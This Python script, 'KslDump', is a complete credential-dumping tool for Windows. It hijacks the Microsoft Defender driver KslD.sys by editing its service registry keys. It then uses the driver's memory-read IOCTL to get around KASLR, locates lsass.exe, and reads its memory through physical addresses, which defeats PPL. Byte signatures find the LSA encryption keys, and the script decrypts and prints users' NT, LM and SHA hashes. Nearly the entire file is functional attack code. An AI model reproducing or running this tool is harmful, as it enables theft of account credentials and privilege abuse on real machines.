"""
KslDump - Credential extraction via KslD.sys (Microsoft Defender driver)
Requires: Administrator privileges, Windows Defender active
Dependency: pip install cryptography
"""
import ctypes, struct, time, subprocess, re, winreg, sys, os, traceback
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers import Cipher, modes
from cryptography.hazmat.primitives.ciphers import algorithms as _alg
try:
    from cryptography.hazmat.decrepit.ciphers import algorithms as _decrepit
    TripleDES = _decrepit.TripleDES
except ImportError:
    TripleDES = _alg.TripleDES
AES = _alg.AES

# ── I/O primitives ──────────────────────────────────────────────

k32 = ctypes.windll.kernel32
k32.CreateFileW.restype = ctypes.c_void_p
INVALID = ctypes.c_void_p(-1).value
IOCTL = 0x222044
_br = wintypes.DWORD()

def ioctl(h, data, out_size=4096):
    out = ctypes.create_string_buffer(out_size)
    ok = k32.DeviceIoControl(wintypes.HANDLE(h), IOCTL, data, len(data),
                              out, out_size, ctypes.byref(_br), None)
    return ok, out.raw[:_br.value] if _br.value > 0 else b''

def phys_read(h, addr, size):
    ok, out = ioctl(h, struct.pack('<IIQQII', 12, 0, addr, size, 1, 0), max(size+256, 4096))
    return out if ok and len(out) >= size else None

def virt_read(h, addr, size):
    ok, out = ioctl(h, struct.pack('<IIQQII', 12, 0, addr, size, 2, 0), max(size+256, 4096))
    return out if ok and len(out) >= size else None

# ── KASLR bypass via SubCmd 2 ────────────────────────────────────
# NtQuerySystemInformation zeroes kernel addresses on Win11.
# SubCmd 2 returns CPU registers (CR3, IDTR) which leak kernel addresses.

def kaslr_bypass(h):
    """SubCmd 2 → IDTR → IDT → lowest ISR → scan backwards for ntoskrnl MZ."""
    ok, regs = ioctl(h, struct.pack('<II', 2, 0), 512)
    if not ok or len(regs) < 448:
        raise Exception("SubCmd 2 failed")
    idtr = 0
    for i in range(0, len(regs) - 15, 16):
        name = regs[i:i+8].split(b'\x00')[0]
        val = struct.unpack_from('<Q', regs, i + 8)[0]
        if name == b'idtr': idtr = val
    if not idtr:
        raise Exception("No IDTR in SubCmd 2 output")

    idt = virt_read(h, idtr, 256)
    if not idt:
        raise Exception("Failed to read IDT")
    min_isr = None
    for i in range(min(16, len(idt) // 16)):
        e = idt[i*16:(i+1)*16]
        isr = rw(e, 0) | (rw(e, 6) << 16) | (rd(e, 8) << 32)
        if isr > 0xFFFF000000000000:
            if min_isr is None or isr < min_isr: min_isr = isr
    if not min_isr:
        raise Exception("No valid ISR in IDT")

    base = min_isr & ~0xFFF
    for i in range(4096):
        page = virt_read(h, base - i * 0x1000, 2)
        if page and page[:2] == b'MZ':
            return base - i * 0x1000
    raise Exception("ntoskrnl base not found")

# ── Page table walk ─────────────────────────────────────────────

PFN_MASK = 0xFFFFFFFFF000

def vtp(h, dtb, va):
    """Virtual-to-physical with transition page support."""
    db = dtb & PFN_MASK
    for shift, large_mask in [(39, None), (30, 0xFFFFC0000000), (21, 0xFFFFFFFE00000)]:
        d = phys_read(h, db + ((va >> shift) & 0x1FF) * 8, 8)
        if not d: return None
        e = struct.unpack('<Q', d)[0]
        if not (e & 1): return None
        if large_mask and (e & 0x80):
            return (e & large_mask) | (va & ((1 << shift) - 1))
        db = e & PFN_MASK
    # PT level
    d = phys_read(h, db + ((va >> 12) & 0x1FF) * 8, 8)
    if not d: return None
    e = struct.unpack('<Q', d)[0]
    if e & 1:
        return (e & PFN_MASK) | (va & 0xFFF)
    if e & 0x800:  # Transition page (standby list)
        for mask in (0xFFFFFF000, 0xFFFFFFF000, 0xFFFFFFFF000, PFN_MASK):
            pa = (e & mask) | (va & 0xFFF)
            test = phys_read(h, pa & ~0xFFF, 16)
            if test and test != b'\x00' * 16:
                return pa
        return (e & 0xFFFFFF000) | (va & 0xFFF)
    return None

def proc_read(h, dtb, va, size):
    """Read from a process's virtual address space via physical memory."""
    result = b''
    off = 0
    while off < size:
        page_off = (va + off) & 0xFFF
        chunk = min(size - off, 0x1000 - page_off)
        try: pa = vtp(h, dtb, va + off)
        except: pa = None
        if pa is None:
            result += b'\x00' * chunk
        else:
            d = phys_read(h, pa, chunk)
            result += d[:chunk] if d and len(d) >= chunk else b'\x00' * chunk
        off += chunk
    return result

# ── Struct helpers ──────────────────────────────────────────────

def rp(d, o): return struct.unpack_from('<Q', d, o)[0]
def rd(d, o): return struct.unpack_from('<I', d, o)[0]
def rw(d, o): return struct.unpack_from('<H', d, o)[0]
def ri(d, o): return struct.unpack_from('<i', d, o)[0]

def read_ptr(h, dtb, va):
    d = proc_read(h, dtb, va, 8)
    return rp(d, 0)

def resolve_rip(h, dtb, va):
    d = proc_read(h, dtb, va, 4)
    return va + 4 + ri(d, 0) if d else 0

def read_ustr(h, dtb, data, off):
    length, buf = rw(data, off), rp(data, off + 8)
    if not length or not buf: return ""
    raw = proc_read(h, dtb, buf, length)
    try: return raw.decode('utf-16-le')
    except: return ""

def read_astr(h, dtb, data, off):
    length, buf = rw(data, off), rp(data, off + 8)
    if not length or not buf: return ""
    raw = proc_read(h, dtb, buf, length)
    try: return raw.decode('ascii', errors='replace')
    except: return ""

def scan(h, dtb, base, size, pattern):
    results = []
    for off in range(0, size, 0x10000):
        data = proc_read(h, dtb, base + off, min(0x10000, size - off))
        if not data: continue
        pos = 0
        while True:
            idx = data.find(pattern, pos)
            if idx == -1: break
            results.append(base + off + idx)
            pos = idx + 1
    return results

def lsa_decrypt(enc, aes_key, des_key, iv):
    if not enc: return b''
    if len(enc) % 8:
        c = Cipher(AES(aes_key), modes.CFB(iv))
    else:
        c = Cipher(TripleDES(des_key), modes.CBC(iv[:8]))
    d = c.decryptor()
    return d.update(enc) + d.finalize()

# ── MSV / LSA signature tables ─────────────────────────────────

MSV_SIGS = [
    (b'\x45\x89\x34\x24\x48\x8b\xfb\x45\x85\xc0\x0f', 25, -16, 34, 26200),
    (b'\x45\x89\x34\x24\x8b\xfb\x45\x85\xc0\x0f', 25, -16, 34, 26200),
    (b'\x45\x89\x37\x49\x4c\x8b\xf7\x8b\xf3\x45\x85\xc0\x0f', 27, -4, 0, 22631),
    (b'\x45\x89\x34\x24\x48\x8b\xff\x8b\xf3\x45\x85\xc0\x74', 24, -4, 0, 22000),
    (b'\x33\xff\x41\x89\x37\x4c\x8b\xf3\x45\x85\xc0\x74', 23, -4, 0, 18362),
    (b'\x33\xff\x41\x89\x37\x4c\x8b\xf3\x45\x85\xc9\x74', 23, -4, 0, 17134),
    (b'\x33\xff\x45\x89\x37\x48\x8b\xf3\x45\x85\xc9\x74', 23, -4, 0, 15063),
    (b'\x33\xff\x41\x89\x37\x4c\x8b\xf3\x45\x85\xc0\x74', 16, -4, 0, 10240),
]

LSA_SIGS = [
    (b'\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15', 71, -89, 16, 0x38),
    (b'\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15', 58, -89, 16, 0x38),
    (b'\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15', 67, -89, 16, 0x38),
    (b'\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15', 61, -73, 16, 0x38),
    (b'\x83\x64\x24\x30\x00\x44\x8b\x4d\xd8\x48\x8b\x0d', 62, -70, 23, 0x38),
    (b'\x83\x64\x24\x30\x00\x44\x8b\x4d\xd8\x48\x8b\x0d', 62, -70, 23, 0x28),
    (b'\x83\x64\x24\x30\x00\x44\x8b\x4d\xd8\x48\x8b\x0d', 58, -62, 23, 0x28),
    (b'\x83\x64\x24\x30\x00\x44\x8b\x4c\x24\x48\x48\x8b\x0d', 59, -61, 25, 0x18),
    (b'\x83\x64\x24\x30\x00\x44\x8b\x4c\x24\x48\x48\x8b\x0d', 63, -69, 25, 0x18),
]

# ── LogonSession offsets by build ───────────────────────────────

def session_offsets(build):
    if build >= 22000:  return (0x70, 0xA0, 0xB0, 0xE8, 0x118)
    if build >= 9600:   return (0x70, 0x90, 0xA0, 0xD0, 0x108)
    if build >= 7601:   return (0x58, 0x78, 0x88, 0xBC, 0xF0)
    return                     (0x48, 0x68, 0x78, 0xAC, 0xE0)

# ── Step 1: Open device ────────────────────────────────────────

def setup_ksld():
    """Switch ImagePath to vulnerable 333KB KslD.sys, set AllowedProcessName, restart."""
    reg_key = r"SYSTEM\CurrentControlSet\Services\KslD"
    hk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key, 0, winreg.KEY_ALL_ACCESS)
    orig_image = winreg.QueryValueEx(hk, "ImagePath")[0]
    orig_allowed = winreg.QueryValueEx(hk, "AllowedProcessName")[0]
    m = re.match(r'(\\Device\\HarddiskVolume\d+)\\', orig_allowed)
    vol = m.group(1) if m else r"\Device\HarddiskVolume3"

    full_path = os.path.join(os.environ['SystemRoot'], 'System32', 'drivers', 'KslD.sys')
    if not os.path.exists(full_path) or os.path.getsize(full_path) < 200000:
        raise Exception(f"Vulnerable KslD.sys (333KB) not found at {full_path}")

    subprocess.run(['sc', 'stop', 'KslD'], capture_output=True)
    time.sleep(2)
    winreg.SetValueEx(hk, "ImagePath", 0, winreg.REG_EXPAND_SZ, r"system32\drivers\KslD.sys")
    winreg.SetValueEx(hk, "AllowedProcessName", 0, winreg.REG_SZ, vol + sys.executable[2:])
    winreg.CloseKey(hk)
    subprocess.run(['sc', 'start', 'KslD'], capture_output=True)
    time.sleep(3)

    handle = k32.CreateFileW("\\\\.\\KslD", 0xC0000000, 7, None, 3, 0, None)
    if not handle or handle == INVALID:
        raise Exception(f"CreateFile failed (error {k32.GetLastError()})")
    return handle, orig_image, orig_allowed

def cleanup_ksld(handle, orig_image, orig_allowed):
    k32.CloseHandle(wintypes.HANDLE(handle))
    try:
        hk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SYSTEM\CurrentControlSet\Services\KslD", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(hk, "ImagePath", 0, winreg.REG_EXPAND_SZ, orig_image)
        winreg.SetValueEx(hk, "AllowedProcessName", 0, winreg.REG_SZ, orig_allowed)
        winreg.CloseKey(hk)
        subprocess.run(['sc', 'stop', 'KslD'], capture_output=True)
        time.sleep(1)
        subprocess.run(['sc', 'start', 'KslD'], capture_output=True)
    except: pass

# ── Step 2: Find kernel structures via virtual reads ────────────

def find_export(h, base, name):
    """Resolve a PE export by name."""
    hdr = virt_read(h, base, 0x1000)
    pe = rd(hdr, 0x3C)
    exp_rva = rd(hdr, pe + 0x88)
    exp_sz = rd(hdr, pe + 0x8C)
    if not exp_rva: return 0
    exp = virt_read(h, base + exp_rva, exp_sz)
    n_names = rd(exp, 0x18)
    a_rva = rd(exp, 0x1C) - exp_rva
    n_rva = rd(exp, 0x20) - exp_rva
    o_rva = rd(exp, 0x24) - exp_rva
    target = name.encode()
    for i in range(n_names):
        nr = rd(exp, n_rva + i*4) - exp_rva
        if nr < 0 or nr + len(target) >= len(exp): continue
        if exp[nr:nr+len(target)] == target and exp[nr+len(target)] == 0:
            ordinal = rw(exp, o_rva + i*2)
            return base + rd(exp, a_rva + ordinal*4)
    return 0

def find_lsass(h, ntos):
    """EPROCESS walk → find lsass.exe → return (eprocess, dtb, peb_offset)."""
    psip = find_export(h, ntos, "PsInitialSystemProcess")
    sys_ep = rp(virt_read(h, psip, 8), 0)

    # Auto-detect EPROCESS offsets from SYSTEM process (PID=4)
    ep_data = virt_read(h, sys_ep, 0x800)
    off_pid = off_links = off_name = 0
    for off in range(0x100, 0x600, 8):
        if struct.unpack_from('<Q', ep_data, off)[0] == 4:
            nxt = struct.unpack_from('<Q', ep_data, off + 8)[0]
            if nxt > 0xFFFF000000000000:
                off_pid, off_links = off, off + 8
                break
    for off in range(0x200, 0x700):
        if ep_data[off:off+7] == b'System\x00':
            off_name = off
            break
    if not off_pid or not off_name:
        raise Exception("Cannot detect EPROCESS offsets")

    # Walk ActiveProcessLinks → find lsass.exe
    head = sys_ep + off_links
    cur = rp(virt_read(h, head, 8), 0)
    seen = {head}
    for _ in range(500):
        if cur in seen or not cur: break
        seen.add(cur)
        ep = cur - off_links
        nm = virt_read(h, ep + off_name, 15)
        if nm and nm.split(b'\x00')[0].lower() == b'lsass.exe':
            dtb = rp(virt_read(h, ep + 0x28, 8), 0)
            pid = rp(virt_read(h, ep + off_pid, 8), 0)
            print(f"  lsass.exe PID={pid} DTB={dtb:#x}")

            # Auto-detect PEB offset
            ep_data2 = virt_read(h, ep, 0x800)
            for poff in range(0x100, 0x600, 8):
                val = struct.unpack_from('<Q', ep_data2, poff)[0]
                if 0x10000 < val < 0x7FFFFFFFFFFF:
                    peb = proc_read(h, dtb, val, 0x20)
                    if peb and peb != b'\x00' * 0x20:
                        ldr, img = rp(peb, 0x18), rp(peb, 0x10)
                        if 0x10000 < ldr < 0x7FFFFFFFFFFF and 0x10000 < img < 0x7FFFFFFFFFFF:
                            return ep, dtb, poff
            raise Exception("Cannot detect PEB offset")
        cur = rp(virt_read(h, cur, 8), 0)
    raise Exception("lsass.exe not found")

# ── Step 3: Read lsass memory via physical reads (bypasses PPL) ─

def find_lsasrv(h, dtb, ep, peb_off):
    """Walk PEB→LDR module list to find lsasrv.dll."""
    peb_va = rp(virt_read(h, ep + peb_off, 8), 0)
    ldr = rp(proc_read(h, dtb, peb_va, 0x20), 0x18)
    head = ldr + 0x20
    cur = read_ptr(h, dtb, head)
    seen = {head}
    for _ in range(200):
        if cur in seen or not cur: break
        seen.add(cur)
        entry = proc_read(h, dtb, cur - 0x10, 0x80)
        dll_base, dll_size = rp(entry, 0x30), rd(entry, 0x40)
        name_len, name_ptr = rw(entry, 0x48), rp(entry, 0x50)
        if name_len and name_ptr:
            raw = proc_read(h, dtb, name_ptr, min(name_len, 512))
            try: name = raw.decode('utf-16-le').lower()
            except: name = ""
            if 'lsasrv.dll' in name:
                print(f"  lsasrv.dll base={dll_base:#x} size={dll_size:#x}")
                return dll_base, dll_size
        cur = rp(entry, 0x10)
    raise Exception("lsasrv.dll not found")

def get_text_section(h, dtb, base, total_size):
    hdr = proc_read(h, dtb, base, 0x1000)
    pe = rd(hdr, 0x3C)
    nsec = rw(hdr, pe + 6)
    soff = pe + 0x18 + rw(hdr, pe + 0x14)
    for i in range(nsec):
        s = soff + i * 40
        if hdr[s:s+5] == b'.text':
            return base + rd(hdr, s + 12), rd(hdr, s + 8)
    return base + 0x1000, total_size - 0x1000

def extract_bcrypt_key(h, dtb, ptr_va, hk_off):
    handle_va = read_ptr(h, dtb, ptr_va)
    if not handle_va: return None
    hk = proc_read(h, dtb, handle_va, 0x20)
    if not hk or hk[4:8] != b'RUUU': return None
    key_va = rp(hk, 0x10)
    if not key_va: return None
    kd = proc_read(h, dtb, key_va, hk_off + 0x30)
    if not kd: return None
    cb = rd(kd, hk_off)
    if cb == 0 or cb > 64: return None
    return kd[hk_off + 4 : hk_off + 4 + cb]

# ── Step 4: Extract LSA keys + credentials ──────────────────────

def extract_lsa_keys(h, dtb, lsasrv_base, lsasrv_size):
    text_base, text_size = get_text_section(h, dtb, lsasrv_base, lsasrv_size)
    for sig, iv_off, des_off, aes_off, hk_off in LSA_SIGS:
        matches = scan(h, dtb, text_base, text_size, sig)
        if not matches: continue
        for pos in matches:
            try:
                iv = proc_read(h, dtb, resolve_rip(h, dtb, pos + iv_off), 16)
                if not iv or iv == b'\x00' * 16: continue
                des = extract_bcrypt_key(h, dtb, resolve_rip(h, dtb, pos + des_off), hk_off)
                aes = extract_bcrypt_key(h, dtb, resolve_rip(h, dtb, pos + aes_off), hk_off)
                if des and aes:
                    print(f"  LSA keys found")
                    return iv, aes, des
            except: continue
    raise Exception("LSA keys not found")

def find_logon_list(h, dtb, lsasrv_base, lsasrv_size, build):
    text_base, text_size = get_text_section(h, dtb, lsasrv_base, lsasrv_size)
    for sig, fe_off, cnt_off, corr_off, min_build in MSV_SIGS:
        matches = scan(h, dtb, text_base, text_size, sig)
        if not matches: continue
        pos = matches[0]
        try:
            extra = rd(proc_read(h, dtb, pos + corr_off, 4), 0) if corr_off else 0
            list_ptr = resolve_rip(h, dtb, pos + fe_off) + extra
            head = read_ptr(h, dtb, list_ptr)
            if head and head != list_ptr:
                count = 1
                if build >= 9200 and cnt_off:
                    cb = proc_read(h, dtb, resolve_rip(h, dtb, pos + cnt_off), 1)
                    if cb and cb[0]: count = cb[0]
                return list_ptr, count
        except: continue
    raise Exception("LogonSessionList not found")

# ── Step 5: Walk sessions and extract hashes ────────────────────

def extract_creds(h, dtb, list_ptr, count, build, iv, aes, des):
    off_luid, off_user, off_dom, off_ltype, off_cred = session_offsets(build)
    results = []
    for idx in range(count):
        head_va = list_ptr + idx * 16
        entry = read_ptr(h, dtb, head_va)
        seen = {head_va}
        while entry and entry not in seen and len(seen) < 100:
            seen.add(entry)
            data = proc_read(h, dtb, entry, 0x200)
            if not data or data == b'\x00' * 0x200: break
            flink = rp(data, 0)
            user = read_ustr(h, dtb, data, off_user)
            domain = read_ustr(h, dtb, data, off_dom)
            cred_ptr = rp(data, off_cred)
            if user and cred_ptr:
                _walk_creds(h, dtb, cred_ptr, iv, aes, des, results, user, domain)
            entry = flink
    return results

def _walk_creds(h, dtb, cred_ptr, iv, aes, des, results, user, domain):
    seen = set()
    cur = cred_ptr
    while cur and cur not in seen and len(seen) < 20:
        seen.add(cur)
        cd = proc_read(h, dtb, cur, 0x20)
        nxt, pc = rp(cd, 0), rp(cd, 0x10)
        if pc: _walk_primary(h, dtb, pc, iv, aes, des, results, user, domain)
        if not nxt or nxt == cred_ptr: break
        cur = nxt

def _walk_primary(h, dtb, pc_ptr, iv, aes, des, results, user, domain):
    seen = set()
    cur = pc_ptr
    while cur and cur not in seen and len(seen) < 20:
        seen.add(cur)
        pd = proc_read(h, dtb, cur, 0x60)
        if pd == b'\x00' * 0x60: break
        nxt = rp(pd, 0)
        pkg = read_astr(h, dtb, pd, 8)
        enc_len, enc_buf = rw(pd, 0x18), rp(pd, 0x20)
        if pkg == "Primary" and 0 < enc_len < 0x10000 and enc_buf:
            blob = proc_read(h, dtb, enc_buf, enc_len)
            if blob != b'\x00' * enc_len:
                dec = lsa_decrypt(blob, aes, des, iv)
                if len(dec) >= 70 and not dec[40] and dec[41]:  # !isIso && isNtOwf
                    nt  = dec[0x46:0x56]
                    lm  = dec[0x56:0x66]
                    sha = dec[0x66:0x7A]
                    results.append((user, domain, nt.hex(), lm.hex(), sha.hex()))
        if not nxt or nxt == pc_ptr: break
        cur = nxt

# ── Main ────────────────────────────────────────────────────────

def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[-] Run as Administrator"); return

    build = int(winreg.QueryValueEx(
        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"),
        "CurrentBuildNumber")[0])
    print(f"[*] Windows Build {build}")

    # Step 1: Load vulnerable driver + open device
    print("[*] Setting up KslD...")
    handle, orig_image, orig_allowed = setup_ksld()

    try:
        # Step 2: KASLR bypass → ntoskrnl base
        print("[*] KASLR bypass (SubCmd 2)...")
        ntos = kaslr_bypass(handle)
        print(f"  ntoskrnl={ntos:#x}")

        # Step 3: Find lsass via EPROCESS walk (virtual reads)
        print("[*] Finding lsass.exe...")
        ep, dtb, peb_off = find_lsass(handle, ntos)

        # Step 4: Read lsass via physical memory (bypasses PPL)
        print("[*] Finding lsasrv.dll...")
        base, size = find_lsasrv(handle, dtb, ep, peb_off)

        # Step 5: Extract LSA encryption keys
        print("[*] Extracting LSA keys...")
        iv, aes, des = extract_lsa_keys(handle, dtb, base, size)

        print("[*] Finding LogonSessionList...")
        list_ptr, count = find_logon_list(handle, dtb, base, size, build)

        # Step 6: Decrypt credentials
        print("[*] Extracting credentials...")
        results = extract_creds(handle, dtb, list_ptr, count, build, iv, aes, des)

        # Deduplicate by (user, domain, nt_hash)
        seen = set()
        unique = []
        for r in results:
            key = (r[0], r[1], r[2])
            if key not in seen:
                seen.add(key)
                unique.append(r)

        print(f"\n{'='*60}")
        if unique:
            print(f"[+] {len(unique)} credential(s) extracted:\n")
            for user, domain, nt_hash, lm, sha in unique:
                print(f"  {domain}\\{user}")
                print(f"    NT:   {nt_hash}\n")
        else:
            print("[-] No credentials extracted (Credential Guard may be active)")

    finally:
        print("[*] Restoring registry...")
        cleanup_ksld(handle, orig_image, orig_allowed)

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"\n[-] FATAL: {e}")
        traceback.print_exc()
